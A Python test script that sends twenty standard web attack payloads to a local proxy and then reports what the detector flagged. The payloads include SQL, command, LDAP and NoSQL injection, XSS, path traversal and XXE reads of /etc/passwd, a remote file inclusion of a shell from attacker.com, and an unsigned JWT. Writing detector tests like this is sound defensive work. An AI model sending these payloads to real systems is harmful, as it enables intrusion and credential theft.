#!/usr/bin/env python3
"""
Real-life Zero-Day Attack Detection Test
Simulates various attack patterns through the proxy to demonstrate detection
"""
import asyncio
import httpx
import sys
import os
import json
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Real-world attack patterns that trigger detection
ATTACKS = [
    {
        "name": "SQL Injection - Classic",
        "method": "GET",
        "path": "/api/users",
        "payload": "?id=1' OR '1'='1' --",
        "headers": {}
    },
    {
        "name": "SQL Injection - UNION-based",
        "method": "GET",
        "path": "/api/search",
        "payload": "?q=test' UNION SELECT username, password FROM users --",
        "headers": {}
    },
    {
        "name": "XSS - Reflected",
        "method": "GET",
        "path": "/search",
        "payload": "?q=<script>alert('XSS')</script>",
        "headers": {}
    },
    {
        "name": "XSS - Event Handler",
        "method": "POST",
        "path": "/api/comments",
        "payload": '{"text": "<img src=x onerror=alert(\'XSS\')>"}',
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Path Traversal",
        "method": "GET",
        "path": "/api/file",
        "payload": "?file=../../../etc/passwd",
        "headers": {}
    },
    {
        "name": "Path Traversal - Windows",
        "method": "GET",
        "path": "/api/document",
        "payload": "?doc=..\\..\\windows\\system32\\config\\sam",
        "headers": {}
    },
    {
        "name": "Command Injection",
        "method": "GET",
        "path": "/api/ping",
        "payload": "?host=localhost; cat /etc/passwd",
        "headers": {}
    },
    {
        "name": "Command Injection - Windows",
        "method": "GET",
        "path": "/api/exec",
        "payload": "?cmd=ping && dir C:\\",
        "headers": {}
    },
    {
        "name": "XXE - XML External Entity",
        "method": "POST",
        "path": "/api/upload",
        "payload": '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>''',
        "headers": {"Content-Type": "application/xml"}
    },
    {
        "name": "LDAP Injection",
        "method": "GET",
        "path": "/api/search",
        "payload": "?user=*)(uid=*))(|(uid=*",
        "headers": {}
    },
    {
        "name": "NoSQL Injection",
        "method": "POST",
        "path": "/api/login",
        "payload": '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "RFI - Remote File Inclusion",
        "method": "GET",
        "path": "/api/page",
        "payload": "?file=http://attacker.com/shell.php",
        "headers": {}
    },
    {
        "name": "LFI - Local File Inclusion",
        "method": "GET",
        "path": "/download",
        "payload": "?file=/etc/passwd",
        "headers": {}
    },
    {
        "name": "CRLF Injection",
        "method": "GET",
        "path": "/api/log",
        "payload": "?msg=test%0d%0aSet-Cookie: admin=true",
        "headers": {}
    },
    {
        "name": "Malicious Headers - SQLMap User-Agent",
        "method": "GET",
        "path": "/",
        "payload": "",
        "headers": {"User-Agent": "sqlmap/1.6.5.6#stable"}
    },
    {
        "name": "Malicious Headers - Scanner Detection",
        "method": "GET",
        "path": "/",
        "payload": "",
        "headers": {"User-Agent": "nikto/2.1.6"}
    },
    {
        "name": "Admin Bypass Attempt",
        "method": "GET",
        "path": "/admin",
        "payload": "?bypass=1&admin=1&token=anything",
        "headers": {}
    },
    {
        "name": "Privilege Escalation Attempt",
        "method": "POST",
        "path": "/api/user/role",
        "payload": '{"role": "admin", "user_id": 1}',
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Authentication Bypass - JWT",
        "method": "GET",
        "path": "/api/protected",
        "payload": "",
        "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0."}
    },
    {
        "name": "Buffer Overflow Attempt",
        "method": "POST",
        "path": "/api/data",
        "payload": "A" * 10000,
        "headers": {}
    }
]


async def send_attack(client, proxy_url, attack):
    """Send a single attack through the proxy"""
    try:
        print(f"\n{'='*70}")
        print(f"🎯 Attack: {attack['name']}")
        print(f"{'='*70}")
        print(f"Method: {attack['method']}")
        
        # Construct URL based on method
        if attack['method'] == 'GET':
            # For GET, payload is query string
            target_url = f"{proxy_url}{attack['path']}{attack['payload']}"
            print(f"URL: {target_url[:100]}...")
            response = await client.get(target_url, headers=attack['headers'])
        else:
            # For POST, payload is body
            target_url = f"{proxy_url}{attack['path']}"
            print(f"URL: {target_url[:100]}...")
            print(f"Payload (body): {attack['payload'][:80]}...")
            response = await client.post(
                target_url, 
                content=attack['payload'],
                headers=attack['headers']
            )
        
        print(f"Response Status: {response.status_code}")
        print(f"✅ Attack payload delivered!")
        
        return True
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False


async def test_zeroday_attacks():
    """Run all zero-day attack simulations through the proxy"""
    
    proxy_url = "http://localhost:8000"
    
    print("\n" + "="*70)
    print("🚀 ZERO-DAY ATTACK DETECTION TEST")
    print("="*70)
    print(f"Proxy: {proxy_url}")
    print(f"Target Backend: http://localhost:3000")
    print(f"Attacks to simulate: {len(ATTACKS)}")
    print("="*70)
    
    successful = 0
    failed = 0
    
    # Use the proxy to forward requests (httpx doesn't use proxies dict, make direct requests to proxy)
    async with httpx.AsyncClient(timeout=10.0) as client:
        for attack in ATTACKS:
            success = await send_attack(client, proxy_url, attack)
            if success:
                successful += 1
            else:
                failed += 1
            
            # Delay between attacks to avoid rate limiting and let analyzer process each request
            # Increased from 2.0s to better handle API rate limits
            await asyncio.sleep(3.0)
    
    # Summary
    print("\n" + "="*70)
    print("📊 ATTACK SIMULATION SUMMARY")
    print("="*70)
    print(f"✅ Successful: {successful}/{len(ATTACKS)}")
    print(f"❌ Failed: {failed}/{len(ATTACKS)}")
    print("\n📝 Check detection results:")
    print("   - proxy.log (all requests logged)")
    print("   - phase2/alerts.json (detected threats)")
    print("   - phase2/statistics.json (statistics)")
    print("="*70)
    
    # Try to read alerts
    try:
        if os.path.exists("phase2/alerts.json"):
            with open("phase2/alerts.json", "r") as f:
                data = json.load(f)
                alerts = data.get('alerts', [])
                if alerts:
                    print(f"\n🚨 DETECTIONS: {len(alerts)} threats detected")
                    for i, alert in enumerate(alerts[-5:], 1):  # Show last 5
                        print(f"\n  {i}. {alert.get('threat_type', 'Unknown')} "
                              f"(Severity: {alert.get('severity', 'N/A')})")
                        print(f"     Confidence: {alert.get('confidence', 'N/A')}%")
    except Exception as e:
        print(f"Could not read alerts: {e}")


if __name__ == "__main__":
    asyncio.run(test_zeroday_attacks())
